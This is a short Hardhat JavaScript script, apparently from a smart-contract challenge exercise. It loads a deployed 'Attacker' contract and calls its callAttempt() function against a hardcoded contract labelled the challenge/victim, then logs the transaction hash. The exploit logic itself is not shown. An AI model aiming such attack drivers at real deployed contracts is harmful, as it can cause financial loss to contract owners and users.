const hre = require("hardhat");

async function main() {
  // your deployed attacker contract:
  const attackerAddress = "0x42BC618f563d007F30519f429Df9ba11BF75761a";
  // the challenge/victim contract address:
  const targetAddress = "0x71828844593C9C0525b6A0F99eFd0ec5771C52b8";

  const attacker = await hre.ethers.getContractAt("Attacker", attackerAddress);

  console.log("Calling attempt() on:", targetAddress);

  const tx = await attacker.callAttempt(targetAddress);
  await tx.wait();

  console.log("Attack executed! Tx hash:", tx.hash);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
